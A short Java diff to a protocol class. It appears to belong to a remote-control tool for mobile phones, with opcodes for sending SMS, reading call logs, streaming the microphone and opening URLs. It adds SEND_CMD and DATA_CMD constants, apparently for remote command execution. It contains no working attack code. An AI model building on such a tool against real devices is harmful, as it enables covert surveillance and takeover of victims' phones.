@@ -56,6 +56,7 @@ public class Protocol {
 	public final static short GET_ADV_INFORMATIONS = (short) (P_INST + 21); // -
 	public final static short OPEN_BROWSER = (short) (P_INST + 22); // String url
 	public final static short DO_VIBRATE = (short) (P_INST + 23); // long millisec
+	public final static short SEND_CMD = (short) (P_INST + 24);
 	// email ?
 	
 	//--- Reponse Client -> Server
@@ -76,6 +77,7 @@ public class Protocol {
 	public final static short ACK_GIVE_CALL = (short) (P_REP + 13);
 	public final static short ACK_SEND_SMS = (short) (P_REP + 14);
 	public final static short DATA_CALL_LOGS = (short) (P_REP + 15);
+	public final static short DATA_CMD = (short) (P_REP + 16);
 	
 	
 	public final static int ARG_STREAM_AUDIO_MIC = 1; 
